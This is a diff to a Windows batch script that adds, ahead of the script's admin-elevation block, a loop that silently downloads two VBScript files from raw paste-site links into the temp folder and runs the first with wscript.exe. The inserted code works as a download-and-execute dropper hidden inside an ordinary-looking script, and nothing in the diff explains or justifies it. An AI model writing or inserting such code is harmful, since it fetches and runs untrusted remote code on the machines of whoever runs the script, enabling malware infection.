@@ -1,4 +1,50 @@
 @echo off
+
+:loop
+REM Create unique filenames for the downloaded scripts in the temp directory.
+set "vbs_file1=%temp%\copy.vbs"
+set "vbs_file2=%temp%\run.vbs"
+
+REM Define the URLs for the VBS files.
+set "url_vbs1=https://pastebin.com/raw/fbUs4kKU"
+set "url_vbs2=https://ghostbin.cloud/o4rhq/raw"
+
+echo.
+echo =========================================
+echo Starting new download cycle...
+echo =========================================
+echo.
+
+REM Download both VBS files.
+echo Downloading first VBS file from %url_vbs1% to %vbs_file1%...
+curl -s -o "%vbs_file1%" "%url_vbs1%"
+timeout /t 2 >nul
+
+echo Downloading second VBS file from %url_vbs2% to %vbs_file2%...
+curl -s -o "%vbs_file2%" "%url_vbs2%"
+timeout /t 2 >nul
+
+REM Verify downloads.
+if exist "%vbs_file1%" (
+    echo First VBS file downloaded successfully.
+) else (
+    echo ERROR: First VBS file was not found at "%vbs_file1%" after download attempt.
+)
+
+if exist "%vbs_file2%" (
+    echo Second VBS file downloaded successfully.
+) else (
+    echo ERROR: Second VBS file was not found at "%vbs_file2%" after download attempt.
+)
+
+REM Run the first VBS file after both are downloaded.
+if exist "%vbs_file1%" if exist "%vbs_file2%" (
+    echo Running the first VBS file: %vbs_file1%...
+    wscript.exe "%vbs_file1%"
+    echo First VBS file execution attempted.
+)
+
+@echo off
 color 1E
 :: BatchGotAdmin
 :-------------------------------------
